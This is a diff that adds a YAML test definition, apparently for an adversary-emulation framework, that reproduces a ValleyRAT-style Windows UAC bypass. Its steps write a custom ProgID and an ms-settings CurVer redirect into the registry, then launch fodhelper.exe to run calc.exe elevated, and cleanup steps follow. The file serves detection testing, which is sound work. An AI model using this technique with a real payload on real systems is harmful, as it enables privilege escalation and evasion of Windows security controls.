@@ -1,0 +1,31 @@
+api_version: "2.0"
+name: UAC bypassed by Utilizing ProgIDs registry.
+description: |
+    This atomic designed to simulate the UAC bypassed made by ValleyRAT by adding customized ProgIDs registry entry.
+uuid: b6f4645c-34ea-4c7c-98f2-d5a2747efb08
+mitre:
+    tactics:
+        - 'TA0004: Privilege Escalation'
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1548: Abuse Elevation Control Mechanism'
+    subtechniques:
+        - 'T1548.002: Bypass User Account Control'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: uac-bypassed-by-utilizing-progids-registry.
+      inline: |
+        reg add "HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command" /ve /d "C:\Windows\System32\calc.exe" /f
+
+        reg add "HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer" /ve /d ".pwn" /f
+
+        echo Triggering fodhelper.exe for potential privilege escalation...
+        start fodhelper.exe
+      executor: command_prompt
+      cleanup:
+        inline: |
+            reg delete "HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command" /ve /f
+            reg delete "HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer" /ve /f
+        executor: command_prompt
